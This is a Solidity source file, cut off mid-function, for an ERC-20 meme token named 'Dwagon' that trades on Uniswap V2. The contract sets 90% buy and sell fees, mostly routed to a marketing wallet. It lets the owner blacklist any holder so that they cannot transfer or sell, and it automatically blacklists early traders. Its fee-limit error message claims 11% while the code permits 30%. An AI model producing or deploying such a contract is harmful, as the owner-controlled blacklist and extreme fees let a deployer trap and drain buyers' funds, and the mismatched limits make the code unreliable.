1 /*
2  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
3 | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
4 | |  ________    | || | _____  _____ | || |      __      | || |    ______    | || |     ____     | || | ____  _____  | |
5 | | |_   ___ `.  | || ||_   _||_   _|| || |     /  \     | || |  .' ___  |   | || |   .'    `.   | || ||_   \|_   _| | |
6 | |   | |   `. \ | || |  | | /\ | |  | || |    / /\ \    | || | / .'   \_|   | || |  /  .--.  \  | || |  |   \ | |   | |
7 | |   | |    | | | || |  | |/  \| |  | || |   / ____ \   | || | | |    ____  | || |  | |    | |  | || |  | |\ \| |   | |
8 | |  _| |___.' / | || |  |   /\   |  | || | _/ /    \ \_ | || | \ `.___]  _| | || |  \  `--'  /  | || | _| |_\   |_  | |
9 | | |________.'  | || |  |__/  \__|  | || ||____|  |____|| || |  `._____.'   | || |   `.____.'   | || ||_____|\____| | |
10 | |              | || |              | || |              | || |              | || |              | || |              | |
11 | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
12  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
13 */
14 // SPDX-License-Identifier: MIT
15 pragma solidity 0.8.15;
16 pragma experimental ABIEncoderV2;
17 
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address) {
20         return msg.sender;
21     }
22 
23     function _msgData() internal view virtual returns (bytes calldata) {
24         return msg.data;
25     }
26 }
27 
28 contract Ownable is Context {
29     address private _owner;
30 
31     event OwnershipTransferred(
32         address indexed previousOwner,
33         address indexed newOwner
34     );
35 
36     /**
37      * @dev Initializes the contract setting the deployer as the initial owner.
38      */
39     constructor() {
40         _transferOwnership(_msgSender());
41     }
42 
43     /**
44      * @dev Returns the address of the current owner.
45      */
46     function owner() public view virtual returns (address) {
47         return _owner;
48     }
49 
50     /**
51      * @dev Throws if called by any account other than the owner.
52      */
53     modifier onlyOwner() {
54         require(owner() == _msgSender(), "Ownable: caller is not the owner");
55         _;
56     }
57 
58     function renounceOwnership() public virtual onlyOwner {
59         _transferOwnership(address(0));
60     }
61 
62     /**
63      * @dev Transfers ownership of the contract to a new account (`newOwner`).
64      * Can only be called by the current owner.
65      */
66     function transferOwnership(address newOwner) public virtual onlyOwner {
67         require(
68             newOwner != address(0),
69             "Ownable: new owner is the zero address"
70         );
71         _transferOwnership(newOwner);
72     }
73 
74     /**
75      * @dev Transfers ownership of the contract to a new account (`newOwner`).
76      * Internal function without access restriction.
77      */
78     function _transferOwnership(address newOwner) internal virtual {
79         address oldOwner = _owner;
80         _owner = newOwner;
81         emit OwnershipTransferred(oldOwner, newOwner);
82     }
83 }
84 
85 interface IERC20 {
86     /**
87      * @dev Returns the amount of tokens in existence.
88      */
89     function totalSupply() external view returns (uint256);
90 
91     /**
92      * @dev Returns the amount of tokens owned by `account`.
93      */
94     function balanceOf(address account) external view returns (uint256);
95 
96     /**
97      * @dev Moves `amount` tokens from the caller's account to `recipient`.
98      *
99      * Returns a boolean value indicating whether the operation succeeded.
100      *
101      * Emits a {Transfer} event.
102      */
103     function transfer(address recipient, uint256 amount)
104         external
105         returns (bool);
106 
107     function allowance(address owner, address spender)
108         external
109         view
110         returns (uint256);
111 
112     function approve(address spender, uint256 amount) external returns (bool);
113 
114     function transferFrom(
115         address sender,
116         address recipient,
117         uint256 amount
118     ) external returns (bool);
119 
120     /**
121      * @dev Emitted when `value` tokens are moved from one account (`from`) to
122      * another (`to`).
123      *
124      * Note that `value` may be zero.
125      */
126     event Transfer(address indexed from, address indexed to, uint256 value);
127 
128     /**
129      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
130      * a call to {approve}. `value` is the new allowance.
131      */
132     event Approval(
133         address indexed owner,
134         address indexed spender,
135         uint256 value
136     );
137 }
138 
139 interface IERC20Metadata is IERC20 {
140     /**
141      * @dev Returns the name of the token.
142      */
143     function name() external view returns (string memory);
144 
145     /**
146      * @dev Returns the symbol of the token.
147      */
148     function symbol() external view returns (string memory);
149 
150     /**
151      * @dev Returns the decimals places of the token.
152      */
153     function decimals() external view returns (uint8);
154 }
155 
156 contract ERC20 is Context, IERC20, IERC20Metadata {
157     mapping(address => uint256) private _balances;
158 
159     mapping(address => mapping(address => uint256)) private _allowances;
160 
161     uint256 private _totalSupply;
162 
163     string private _name;
164     string private _symbol;
165 
166     /**
167      * @dev Sets the values for {name} and {symbol}.
168      *
169      * The default value of {decimals} is 18. To select a different value for
170      * {decimals} you should overload it.
171      *
172      * All two of these values are immutable: they can only be set once during
173      * construction.
174      */
175     constructor(string memory name_, string memory symbol_) {
176         _name = name_;
177         _symbol = symbol_;
178     }
179 
180     /**
181      * @dev Returns the name of the token.
182      */
183     function name() public view virtual override returns (string memory) {
184         return _name;
185     }
186 
187     /**
188      * @dev Returns the symbol of the token, usually a shorter version of the
189      * name.
190      */
191     function symbol() public view virtual override returns (string memory) {
192         return _symbol;
193     }
194 
195     function decimals() public view virtual override returns (uint8) {
196         return 18;
197     }
198 
199     /**
200      * @dev See {IERC20-totalSupply}.
201      */
202     function totalSupply() public view virtual override returns (uint256) {
203         return _totalSupply;
204     }
205 
206     /**
207      * @dev See {IERC20-balanceOf}.
208      */
209     function balanceOf(address account)
210         public
211         view
212         virtual
213         override
214         returns (uint256)
215     {
216         return _balances[account];
217     }
218 
219     function transfer(address recipient, uint256 amount)
220         public
221         virtual
222         override
223         returns (bool)
224     {
225         _transfer(_msgSender(), recipient, amount);
226         return true;
227     }
228 
229     /**
230      * @dev See {IERC20-allowance}.
231      */
232     function allowance(address owner, address spender)
233         public
234         view
235         virtual
236         override
237         returns (uint256)
238     {
239         return _allowances[owner][spender];
240     }
241 
242     /**
243      * @dev See {IERC20-approve}.
244      *
245      * Requirements:
246      *
247      * - `spender` cannot be the zero address.
248      */
249     function approve(address spender, uint256 amount)
250         public
251         virtual
252         override
253         returns (bool)
254     {
255         _approve(_msgSender(), spender, amount);
256         return true;
257     }
258 
259     function transferFrom(
260         address sender,
261         address recipient,
262         uint256 amount
263     ) public virtual override returns (bool) {
264         _transfer(sender, recipient, amount);
265 
266         uint256 currentAllowance = _allowances[sender][_msgSender()];
267         require(
268             currentAllowance >= amount,
269             "ERC20: transfer amount exceeds allowance"
270         );
271         unchecked {
272             _approve(sender, _msgSender(), currentAllowance - amount);
273         }
274 
275         return true;
276     }
277 
278     function increaseAllowance(address spender, uint256 addedValue)
279         public
280         virtual
281         returns (bool)
282     {
283         _approve(
284             _msgSender(),
285             spender,
286             _allowances[_msgSender()][spender] + addedValue
287         );
288         return true;
289     }
290 
291     function decreaseAllowance(address spender, uint256 subtractedValue)
292         public
293         virtual
294         returns (bool)
295     {
296         uint256 currentAllowance = _allowances[_msgSender()][spender];
297         require(
298             currentAllowance >= subtractedValue,
299             "ERC20: decreased allowance below zero"
300         );
301         unchecked {
302             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
303         }
304 
305         return true;
306     }
307 
308     function _transfer(
309         address sender,
310         address recipient,
311         uint256 amount
312     ) internal virtual {
313         require(sender != address(0), "ERC20: transfer from the zero address");
314         require(recipient != address(0), "ERC20: transfer to the zero address");
315 
316         _beforeTokenTransfer(sender, recipient, amount);
317 
318         uint256 senderBalance = _balances[sender];
319         require(
320             senderBalance >= amount,
321             "ERC20: transfer amount exceeds balance"
322         );
323         unchecked {
324             _balances[sender] = senderBalance - amount;
325         }
326         _balances[recipient] += amount;
327 
328         emit Transfer(sender, recipient, amount);
329 
330         _afterTokenTransfer(sender, recipient, amount);
331     }
332 
333     function _mint(address account, uint256 amount) internal virtual {
334         require(account != address(0), "ERC20: mint to the zero address");
335 
336         _beforeTokenTransfer(address(0), account, amount);
337 
338         _totalSupply += amount;
339         _balances[account] += amount;
340         emit Transfer(address(0), account, amount);
341 
342         _afterTokenTransfer(address(0), account, amount);
343     }
344 
345     function _burn(address account, uint256 amount) internal virtual {
346         require(account != address(0), "ERC20: burn from the zero address");
347 
348         _beforeTokenTransfer(account, address(0), amount);
349 
350         uint256 accountBalance = _balances[account];
351         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
352         unchecked {
353             _balances[account] = accountBalance - amount;
354         }
355         _totalSupply -= amount;
356 
357         emit Transfer(account, address(0), amount);
358 
359         _afterTokenTransfer(account, address(0), amount);
360     }
361 
362     function _approve(
363         address owner,
364         address spender,
365         uint256 amount
366     ) internal virtual {
367         require(owner != address(0), "ERC20: approve from the zero address");
368         require(spender != address(0), "ERC20: approve to the zero address");
369 
370         _allowances[owner][spender] = amount;
371         emit Approval(owner, spender, amount);
372     }
373 
374     function _beforeTokenTransfer(
375         address from,
376         address to,
377         uint256 amount
378     ) internal virtual {}
379 
380     function _afterTokenTransfer(
381         address from,
382         address to,
383         uint256 amount
384     ) internal virtual {}
385 }
386 
387 library SafeMath {
388     /**
389      * @dev Returns the addition of two unsigned integers, with an overflow flag.
390      *
391      * _Available since v3.4._
392      */
393     function tryAdd(uint256 a, uint256 b)
394         internal
395         pure
396         returns (bool, uint256)
397     {
398         unchecked {
399             uint256 c = a + b;
400             if (c < a) return (false, 0);
401             return (true, c);
402         }
403     }
404 
405     /**
406      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
407      *
408      * _Available since v3.4._
409      */
410     function trySub(uint256 a, uint256 b)
411         internal
412         pure
413         returns (bool, uint256)
414     {
415         unchecked {
416             if (b > a) return (false, 0);
417             return (true, a - b);
418         }
419     }
420 
421     /**
422      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
423      *
424      * _Available since v3.4._
425      */
426     function tryMul(uint256 a, uint256 b)
427         internal
428         pure
429         returns (bool, uint256)
430     {
431         unchecked {
432             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
433             // benefit is lost if 'b' is also tested.
434             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
435             if (a == 0) return (true, 0);
436             uint256 c = a * b;
437             if (c / a != b) return (false, 0);
438             return (true, c);
439         }
440     }
441 
442     /**
443      * @dev Returns the division of two unsigned integers, with a division by zero flag.
444      *
445      * _Available since v3.4._
446      */
447     function tryDiv(uint256 a, uint256 b)
448         internal
449         pure
450         returns (bool, uint256)
451     {
452         unchecked {
453             if (b == 0) return (false, 0);
454             return (true, a / b);
455         }
456     }
457 
458     /**
459      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
460      *
461      * _Available since v3.4._
462      */
463     function tryMod(uint256 a, uint256 b)
464         internal
465         pure
466         returns (bool, uint256)
467     {
468         unchecked {
469             if (b == 0) return (false, 0);
470             return (true, a % b);
471         }
472     }
473 
474     function add(uint256 a, uint256 b) internal pure returns (uint256) {
475         return a + b;
476     }
477 
478     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
479         return a - b;
480     }
481 
482     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
483         return a * b;
484     }
485 
486     function div(uint256 a, uint256 b) internal pure returns (uint256) {
487         return a / b;
488     }
489 
490     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
491         return a % b;
492     }
493 
494     function sub(
495         uint256 a,
496         uint256 b,
497         string memory errorMessage
498     ) internal pure returns (uint256) {
499         unchecked {
500             require(b <= a, errorMessage);
501             return a - b;
502         }
503     }
504 
505     function div(
506         uint256 a,
507         uint256 b,
508         string memory errorMessage
509     ) internal pure returns (uint256) {
510         unchecked {
511             require(b > 0, errorMessage);
512             return a / b;
513         }
514     }
515 
516     function mod(
517         uint256 a,
518         uint256 b,
519         string memory errorMessage
520     ) internal pure returns (uint256) {
521         unchecked {
522             require(b > 0, errorMessage);
523             return a % b;
524         }
525     }
526 }
527 
528 interface IUniswapV2Factory {
529     event PairCreated(
530         address indexed token0,
531         address indexed token1,
532         address pair,
533         uint256
534     );
535 
536     function feeTo() external view returns (address);
537 
538     function feeToSetter() external view returns (address);
539 
540     function getPair(address tokenA, address tokenB)
541         external
542         view
543         returns (address pair);
544 
545     function allPairs(uint256) external view returns (address pair);
546 
547     function allPairsLength() external view returns (uint256);
548 
549     function createPair(address tokenA, address tokenB)
550         external
551         returns (address pair);
552 
553     function setFeeTo(address) external;
554 
555     function setFeeToSetter(address) external;
556 }
557 
558 interface IUniswapV2Pair {
559     event Approval(
560         address indexed owner,
561         address indexed spender,
562         uint256 value
563     );
564     event Transfer(address indexed from, address indexed to, uint256 value);
565 
566     function name() external pure returns (string memory);
567 
568     function symbol() external pure returns (string memory);
569 
570     function decimals() external pure returns (uint8);
571 
572     function totalSupply() external view returns (uint256);
573 
574     function balanceOf(address owner) external view returns (uint256);
575 
576     function allowance(address owner, address spender)
577         external
578         view
579         returns (uint256);
580 
581     function approve(address spender, uint256 value) external returns (bool);
582 
583     function transfer(address to, uint256 value) external returns (bool);
584 
585     function transferFrom(
586         address from,
587         address to,
588         uint256 value
589     ) external returns (bool);
590 
591     function DOMAIN_SEPARATOR() external view returns (bytes32);
592 
593     function PERMIT_TYPEHASH() external pure returns (bytes32);
594 
595     function nonces(address owner) external view returns (uint256);
596 
597     function permit(
598         address owner,
599         address spender,
600         uint256 value,
601         uint256 deadline,
602         uint8 v,
603         bytes32 r,
604         bytes32 s
605     ) external;
606 
607     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
608     event Burn(
609         address indexed sender,
610         uint256 amount0,
611         uint256 amount1,
612         address indexed to
613     );
614     event Swap(
615         address indexed sender,
616         uint256 amount0In,
617         uint256 amount1In,
618         uint256 amount0Out,
619         uint256 amount1Out,
620         address indexed to
621     );
622     event Sync(uint112 reserve0, uint112 reserve1);
623 
624     function MINIMUM_LIQUIDITY() external pure returns (uint256);
625 
626     function factory() external view returns (address);
627 
628     function token0() external view returns (address);
629 
630     function token1() external view returns (address);
631 
632     function getReserves()
633         external
634         view
635         returns (
636             uint112 reserve0,
637             uint112 reserve1,
638             uint32 blockTimestampLast
639         );
640 
641     function price0CumulativeLast() external view returns (uint256);
642 
643     function price1CumulativeLast() external view returns (uint256);
644 
645     function kLast() external view returns (uint256);
646 
647     function mint(address to) external returns (uint256 liquidity);
648 
649     function burn(address to)
650         external
651         returns (uint256 amount0, uint256 amount1);
652 
653     function swap(
654         uint256 amount0Out,
655         uint256 amount1Out,
656         address to,
657         bytes calldata data
658     ) external;
659 
660     function skim(address to) external;
661 
662     function sync() external;
663 
664     function initialize(address, address) external;
665 }
666 
667 interface IUniswapV2Router02 {
668     function factory() external pure returns (address);
669 
670     function WETH() external pure returns (address);
671 
672     function addLiquidity(
673         address tokenA,
674         address tokenB,
675         uint256 amountADesired,
676         uint256 amountBDesired,
677         uint256 amountAMin,
678         uint256 amountBMin,
679         address to,
680         uint256 deadline
681     )
682         external
683         returns (
684             uint256 amountA,
685             uint256 amountB,
686             uint256 liquidity
687         );
688 
689     function addLiquidityETH(
690         address token,
691         uint256 amountTokenDesired,
692         uint256 amountTokenMin,
693         uint256 amountETHMin,
694         address to,
695         uint256 deadline
696     )
697         external
698         payable
699         returns (
700             uint256 amountToken,
701             uint256 amountETH,
702             uint256 liquidity
703         );
704 
705     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
706         uint256 amountIn,
707         uint256 amountOutMin,
708         address[] calldata path,
709         address to,
710         uint256 deadline
711     ) external;
712 
713     function swapExactETHForTokensSupportingFeeOnTransferTokens(
714         uint256 amountOutMin,
715         address[] calldata path,
716         address to,
717         uint256 deadline
718     ) external payable;
719 
720     function swapExactTokensForETHSupportingFeeOnTransferTokens(
721         uint256 amountIn,
722         uint256 amountOutMin,
723         address[] calldata path,
724         address to,
725         uint256 deadline
726     ) external;
727 }
728 
729 contract Dwagon is ERC20, Ownable {
730     using SafeMath for uint256;
731 
732     IUniswapV2Router02 public immutable uniswapV2Router;
733     address public immutable uniswapV2Pair;
734     address public constant deadAddress = address(0xdead);
735 
736     bool private swapping;
737 
738     address public marketingWallet;
739     address public devWallet;
740     address public treasuryWallet;
741 
742     uint256 public maxTransactionAmount;
743     uint256 public swapTokensAtAmount;
744     uint256 public maxWallet;
745 
746     bool public limitsInEffect = true;
747     bool public tradingActive = false;
748     bool public swapEnabled = false;
749 
750     uint256 public launchedAt;
751     uint256 public launchedAtTimestamp;
752     uint256 antiSnipingTime = 60 seconds;
753 
754     uint256 public buyTotalFees = 90;
755     uint256 public buyMarketingFee = 89;
756     uint256 public buyTreasuryFee = 0;
757     uint256 public buyLiquidityFee = 0;
758     uint256 public buyMeltingFee = 0;
759     uint256 public buyDevFee = 1;
760 
761     uint256 public sellTotalFees = 90;
762     uint256 public sellMarketingFee = 89;
763     uint256 public sellLiquidityFee = 0;
764     uint256 public sellMeltingFee = 0;
765     uint256 public sellTreasuryFee = 0;
766     uint256 public sellDevFee = 1;
767 
768     uint256 public tokensForMarketing;
769     uint256 public tokensForLiquidity;
770     uint256 public tokensForDev;
771     uint256 public tokensForTreasury;
772     uint256 public tokensForMelt;
773 
774     /******************/
775 
776     // exlcude from fees and max transaction amount
777     mapping(address => bool) private _isExcludedFromFees;
778     mapping(address => bool) public _isExcludedMaxTransactionAmount;
779     mapping(address => bool) public isSniper;
780 
781     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
782     // could be subject to a maximum transfer amount
783     mapping(address => bool) public automatedMarketMakerPairs;
784 
785     event UpdateUniswapV2Router(
786         address indexed newAddress,
787         address indexed oldAddress
788     );
789 
790     event ExcludeFromFees(address indexed account, bool isExcluded);
791 
792     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
793 
794     event marketingWalletUpdated(
795         address indexed newWallet,
796         address indexed oldWallet
797     );
798 
799     event treasuryWalletUpdated(
800         address indexed newWallet,
801         address indexed oldWallet
802     );
803     event SwapAndLiquify(
804         uint256 tokensSwapped,
805         uint256 ethReceived,
806         uint256 tokensIntoLiquidity
807     );
808 
809     constructor() ERC20("Dwagon", "$Dwagon") {
810         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
811             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
812         );
813 
814         excludeFromMaxTransaction(address(_uniswapV2Router), true);
815         uniswapV2Router = _uniswapV2Router;
816 
817         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
818             .createPair(address(this), _uniswapV2Router.WETH());
819         excludeFromMaxTransaction(address(uniswapV2Pair), true);
820         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
821 
822         uint256 totalSupply = 1_000_000_000 * 1e18;
823 
824         maxTransactionAmount = 10000000 * 1e18; // 1% from total supply maxTransactionAmountTxn
825         maxWallet = 40000000 * 1e18; // 4% from total supply maxWallet
826         swapTokensAtAmount = 150_000 * 1e18;
827 
828         marketingWallet = address(0x16F2844DAEC6e21e11e878e9893a6B416F39678e); // set as marketing wallet
829         devWallet = address(0x4793E9D79896dc8Fa3c3C799e230Fe0A5Ca2424c); // set as dev wallet
830         treasuryWallet = address(0x94478081880354C37F7729e0996165aB29510Ed7);
831         // exclude from paying fees or having max transaction amount
832         excludeFromFees(owner(), true);
833         excludeFromFees(address(this), true);
834         excludeFromFees(address(0xdead), true);
835 
836         excludeFromMaxTransaction(owner(), true);
837         excludeFromMaxTransaction(address(this), true);
838         excludeFromMaxTransaction(address(0xdead), true);
839 
840         /*
841             _mint is an internal function in ERC20.sol that is only called here,
842             and CANNOT be called ever again
843         */
844         _mint(owner(), totalSupply);
845     }
846 
847     receive() external payable {}
848 
849     function launched() internal view returns (bool) {
850         return launchedAt != 0;
851     }
852 
853     function launch() public onlyOwner {
854         require(launchedAt == 0, "Already launched boi");
855         launchedAt = block.number;
856         launchedAtTimestamp = block.timestamp;
857         tradingActive = true;
858         swapEnabled = true;
859     }
860 
861     // remove limits after token is stable
862     function removeLimits() external onlyOwner returns (bool) {
863         limitsInEffect = false;
864         return true;
865     }
866 
867     // change the minimum amount of tokens to sell from fees
868     function updateSwapTokensAtAmount(uint256 newAmount)
869         external
870         onlyOwner
871         returns (bool)
872     {
873         swapTokensAtAmount = newAmount;
874         return true;
875     }
876 
877     function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
878         maxTransactionAmount = newNum * (10**18);
879     }
880 
881     function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
882         maxWallet = newNum * (10**18);
883     }
884 
885     function excludeFromMaxTransaction(address updAds, bool isEx)
886         public
887         onlyOwner
888     {
889         _isExcludedMaxTransactionAmount[updAds] = isEx;
890     }
891 
892     // only use to disable contract sales if absolutely necessary (emergency use only)
893     function updateSwapEnabled(bool enabled) external onlyOwner {
894         swapEnabled = enabled;
895     }
896 
897     function updateBuyFees(
898         uint256 _marketingFee,
899         uint256 _liquidityFee,
900         uint256 _treasuryFee,
901         uint256 _meltingFee
902     ) external onlyOwner {
903         buyMarketingFee = _marketingFee;
904         buyLiquidityFee = _liquidityFee;
905         buyMeltingFee = _meltingFee;
906         buyTreasuryFee = _treasuryFee;
907         buyTotalFees =
908             buyMarketingFee +
909             buyTreasuryFee +
910             buyLiquidityFee +
911             buyDevFee +
912             buyMeltingFee;
913         require(buyTotalFees <= 30, "Must keep fees at 11% or less");
914     }
915 
916     function updateSellFees(
917         uint256 _marketingFee,
918         uint256 _liquidityFee,
919         uint256 _devFee,
920         uint256 _treasuryFee,
921         uint256 _meltingFee
922     ) external onlyOwner {
923         sellMarketingFee = _marketingFee;
924         sellLiquidityFee = _liquidityFee;
925         sellDevFee = _devFee;
926         sellTreasuryFee = _treasuryFee;
927         sellMeltingFee = _meltingFee;
928         sellTotalFees =
929             sellMarketingFee +
930             sellLiquidityFee +
931             sellDevFee +
932             sellTreasuryFee +
933             sellMeltingFee;
934         require(sellTotalFees <= 30, "Must keep fees at 11% or less");
935     }
936 
937     function excludeFromFees(address account, bool excluded) public onlyOwner {
938         _isExcludedFromFees[account] = excluded;
939         emit ExcludeFromFees(account, excluded);
940     }
941 
942     function setAutomatedMarketMakerPair(address pair, bool value)
943         public
944         onlyOwner
945     {
946         require(
947             pair != uniswapV2Pair,
948             "The pair cannot be removed from automatedMarketMakerPairs"
949         );
950 
951         _setAutomatedMarketMakerPair(pair, value);
952     }
953 
954     function _setAutomatedMarketMakerPair(address pair, bool value) private {
955         automatedMarketMakerPairs[pair] = value;
956 
957         emit SetAutomatedMarketMakerPair(pair, value);
958     }
959 
960     function updateMarketingWallet(address newMarketingWallet)
961         external
962         onlyOwner
963     {
964         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
965         marketingWallet = newMarketingWallet;
966     }
967 
968     function updateTreasuryWallet(address newWallet) external onlyOwner {
969         emit treasuryWalletUpdated(newWallet, treasuryWallet);
970         treasuryWallet = newWallet;
971     }
972 
973     function isExcludedFromFees(address account) public view returns (bool) {
974         return _isExcludedFromFees[account];
975     }
976 
977     function addSniperInList(address _account) external onlyOwner {
978         require(
979             _account != address(uniswapV2Router),
980             "We can not blacklist router"
981         );
982         require(!isSniper[_account], "Sniper already exist");
983         isSniper[_account] = true;
984     }
985 
986     function removeSniperFromList(address _account) external onlyOwner {
987         require(isSniper[_account], "Not a sniper");
988         isSniper[_account] = false;
989     }
990 
991     function _transfer(
992         address from,
993         address to,
994         uint256 amount
995     ) internal override {
996         require(from != address(0), "ERC20: transfer from the zero address");
997         require(to != address(0), "ERC20: transfer to the zero address");
998         require(!isSniper[to], "Sniper detected");
999         require(!isSniper[from], "Sniper detected");
1000 
1001         if (amount == 0) {
1002             super._transfer(from, to, 0);
1003             return;
1004         }
1005 
1006         if (limitsInEffect) {
1007             if (
1008                 from != owner() &&
1009                 to != owner() &&
1010                 to != address(0) &&
1011                 to != address(0xdead) &&
1012                 !swapping
1013             ) {
1014                 if (!tradingActive) {
1015                     require(
1016                         _isExcludedFromFees[from] || _isExcludedFromFees[to],
1017                         "Trading is not active."
1018                     );
1019                 }
1020                 // antibot
1021                 if (
1022                     block.timestamp < launchedAtTimestamp + antiSnipingTime &&
1023                     from != address(uniswapV2Router)
1024                 ) {
1025                     if (from == uniswapV2Pair) {
1026                         isSniper[to] = true;
1027                     } else if (to == uniswapV2Pair) {
1028                         isSniper[from] = true;
1029                     }
1030                 }
1031                 //when buy
1032                 if (
1033                     automatedMarketMakerPairs[from] &&
1034                     !_isExcludedMaxTransactionAmount[to]
1035                 ) {
1036                     require(
1037                         amount <= maxTransactionAmount,
1038                         "Buy transfer amount exceeds the maxTransactionAmount."
1039                     );
1040                     require(
1041                         amount + balanceOf(to) <= maxWallet,
1042                         "Max wallet exceeded"
1043                     );
1044                 }
1045                 //when sell
1046                 else if (
1047                     automatedMarketMakerPairs[to] &&
1048                     !_isExcludedMaxTransactionAmount[from]
1049                 ) {
1050                     require(
1051                         amount <= maxTransactionAmount,
1052                         "Sell transfer amount exceeds the maxTransactionAmount."
1053                     );
1054                 } else if (!_isExcludedMaxTransactionAmount[to]) {
1055                     require(
1056                         amount + balanceOf(to) <= maxWallet,
1057                         "Max wallet exceeded"
1058                     );
1059                 }
1060             }
1061         }
1062 
1063         uint256 contractTokenBalance = balanceOf(address(this));
1064 
1065         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1066 
1067         if (
1068             canSwap &&
1069             swapEnabled &&
1070             !swapping &&
1071             !automatedMarketMakerPairs[from] &&
1072             !_isExcludedFromFees[from] &&
1073             !_isExcludedFromFees[to]
1074         ) {
1075             swapping = true;
1076 
1077             swapBack();
1078 
1079             swapping = false;
1080         }
1081 
1082         bool takeFee = !swapping;
1083 
1084         // if any account belongs to _isExcludedFromFee account then remove the fee
1085         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1086             takeFee = false;
1087         }
1088 
1089         uint256 fees = 0;
1090         // only take fees on buys/sells, do not take on wallet transfers
1091         if (takeFee) {
1092             // on sell
1093             if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
1094                 fees = amount.mul(sellTotalFees).div(100);
1095                 tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
1096                 tokensForDev += (fees * sellDevFee) / sellTotalFees;
1097                 tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
1098                 tokensForTreasury += (fees * sellTreasuryFee) / sellTotalFees;
1099                 tokensForMelt = (fees * sellMeltingFee) / sellTotalFees;
1100             }
1101             // on buy
1102             else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
1103                 fees = amount.mul(buyTotalFees).div(100);
1104                 tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
1105                 tokensForDev += (fees * buyDevFee) / buyTotalFees;
1106                 tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
1107                 tokensForTreasury += (fees * buyTreasuryFee) / buyTotalFees;
1108                 tokensForMelt = (fees * buyMeltingFee) / buyTotalFees;
1109             }
1110 
1111             if (fees > 0) {
1112                 _burn(from, tokensForMelt);
1113                 super._transfer(from, address(this), fees - tokensForMelt);
1114             }
1115 
1116             amount -= fees;
1117         }
1118 
1119         super._transfer(from, to, amount);
1120     }
1121 
1122     function swapTokensForEth(uint256 tokenAmount) private {
1123         // generate the uniswap pair path of token -> weth
1124         address[] memory path = new address[](2);
1125         path[0] = address(this);
1126         path[1] = uniswapV2Router.WETH();
1127 
1128         _approve(address(this), address(uniswapV2Router), tokenAmount);
1129 
1130         // make the swap
1131         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1132             tokenAmount,
1133             0, // accept any amount of ETH
1134             path,
1135             address(this),
1136             block.timestamp
1137         );
1138     }
1139 
1140     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1141         // approve token transfer to cover all possible scenarios
1142         _approve(address(this), address(uniswapV2Router), tokenAmount);
1143 
1144         // add the liquidity
1145         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1146             address(this),
1147             tokenAmount,
1148             0, // slippage is unavoidable
1149             0, // slippage is unavoidable
1150             deadAddress,
1151             block.timestamp
1152         );
1153     }
1154 
1155     function swapBack() private {
1156         uint256 contractBalance = balanceOf(address(this));
1157         uint256 totalTokensToSwap = tokensForLiquidity +
1158             tokensForMarketing +
1159             tokensForTreasury +
1160             tokensForDev;
1161         bool success;
1162 
1163         if (contractBalance == 0 || totalTokensToSwap == 0) {
1164             return;
1165         }
1166 
1167         if (contractBalance > swapTokensAtAmount) {
1168             contractBalance = swapTokensAtAmount;
1169         }
1170 
1171         // Halve the amount of liquidity tokens
1172         uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
1173             totalTokensToSwap /
1174             2;
1175         uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
1176 
1177         uint256 initialETHBalance = address(this).balance;
1178 
1179         swapTokensForEth(amountToSwapForETH);
1180 
1181         uint256 ethBalance = address(this).balance.sub(initialETHBalance);
1182 
1183         uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(
1184             totalTokensToSwap
1185         );
1186         uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);
1187 
1188         uint256 ethForTreasury = ethBalance.mul(tokensForTreasury).div(
1189             totalTokensToSwap
1190         );
1191 
1192         uint256 ethForLiquidity = ethBalance -
1193             ethForMarketing -
1194             ethForDev -
1195             ethForTreasury;
1196 
1197         tokensForLiquidity = 0;
1198         tokensForMarketing = 0;
1199         tokensForDev = 0;
1200         tokensForTreasury = 0;
1201 
1202         (success, ) = address(devWallet).call{value: ethForDev}("");
1203 
1204         if (liquidityTokens > 0 && ethForLiquidity > 0) {
1205             addLiquidity(liquidityTokens, ethForLiquidity);
1206             emit SwapAndLiquify(
1207                 amountToSwapForETH,
1208                 ethForLiquidity,
1209                 tokensForLiquidity
1210             );
1211         }
1212 
1213         (success, ) = address(marketingWallet).call{value: ethForMarketing}("");
1214         (success, ) = address(treasuryWallet).call{
1215             value: address(this).balance
1216         }("");
1217     }
1218 
1219     function airdrop(address[] calldata addresses, uint256[] calldata amounts)
1220         external
1221         onlyOwner
1222     {
